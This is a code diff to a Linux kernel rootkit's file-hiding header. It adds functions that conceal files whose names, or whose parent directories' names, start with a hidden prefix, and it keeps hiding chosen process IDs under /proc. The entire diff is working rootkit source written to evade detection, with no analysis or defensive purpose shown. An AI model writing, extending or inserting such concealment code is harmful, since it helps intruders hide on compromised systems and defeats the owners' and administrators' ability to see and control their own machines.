@@ -1,6 +1,7 @@
 #ifndef _ROOTKIT_FILES_H_
 #define _ROOTKIT_FILES_H_
 
+#include "constants.h"
 #include "macro_utils.h"
 #include "utils.h"
 #include <linux/types.h>
@@ -156,16 +157,31 @@ static inline bool is_proc_pid_descendant(const file_t *const p_file, const pid_
 /**
  * Does the given file name need to be hidden?
  *
+ * @param s_filename The file name to check
+ * @return `true` if the given file needs to be hidden, `false` otherwise
+ */
+static inline bool is_filename_hidden(const char *const s_filename)
+{
+    // Check the name starts with the hidden prefix
+    return strncmp(s_filename, S_HIDDEN_PREFIX, HIDDEN_PREFIX_LEN) == 0;
+}
+
+/**
+ * Does the given file name need to be hidden?
+ * Checks if the file name starts with the hidden prefix,
+ * or if it is a hidden PID folder in /proc/.
+ *
  * @param s_filename      The file name to check
  * @param b_is_proc_child Is the file a child of /proc/?
  * @return `true` if the given file needs to be hidden, `false` otherwise
  */
-static inline bool is_filename_hidden(const char *const s_filename, const bool b_is_proc_child)
+static inline bool is_filename_or_pid_hidden(const char *const s_filename,
+                                             const bool b_is_proc_child)
 {
     pid_t i32_pid = 0; // PID as an integer
 
     // Check the name starts with the hidden prefix
-    IF_U (!strncmp(s_filename, S_HIDDEN_PREFIX, HIDDEN_PREFIX_LEN)) {
+    IF_U (is_filename_hidden(s_filename)) {
         pr_info("[ROOTKIT] * This file name starts with the hidden prefix\n");
         return true;
     }
@@ -198,7 +214,8 @@ static inline bool is_filename_hidden(const char *const s_filename, const bool b
  */
 static inline bool is_file_hidden(const file_t *const p_file)
 {
-    pid_t i32_found_pid = -1; // PID of the process found in the path, if any
+    const dentry_t *p_parent = NULL; // dentry structure for parent directories
+    pid_t i32_found_pid      = -1;   // PID of the process found in the path, if any
 
     IF_U (p_file == NULL) {
         return false;
@@ -214,7 +231,22 @@ static inline bool is_file_hidden(const file_t *const p_file)
         pr_info("[ROOTKIT] * This is not a process file\n");
     }
 
-    return is_filename_hidden(p_file->f_path.dentry->d_name.name, is_parent_proc_root(p_file));
+    IF_U (is_filename_or_pid_hidden(p_file->f_path.dentry->d_name.name,
+                                    is_parent_proc_root(p_file))) {
+        return true;
+    }
+
+    // If the file is not a process file, check if one of its parents has a hidden name
+    p_parent = p_file->f_path.dentry->d_parent;
+    while (!IS_ROOT(p_parent)) {
+        if (is_filename_hidden(p_parent->d_name.name)) {
+            return true;
+        }
+
+        p_parent = p_parent->d_parent;
+    }
+
+    return false;
 }
 
 /**
